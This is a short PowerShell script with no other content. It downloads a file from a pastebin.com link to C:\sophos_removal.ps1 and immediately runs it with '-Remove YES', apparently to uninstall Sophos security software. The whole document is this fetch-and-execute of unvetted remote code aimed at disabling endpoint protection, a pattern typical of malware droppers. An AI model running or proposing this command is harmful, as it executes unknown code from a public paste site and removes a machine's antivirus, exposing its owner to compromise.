$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://pastebin.com/dl/4eRc5WpA","C:\sophos_removal.ps1")
cd \
./sophos_removal.ps1 -Remove YES



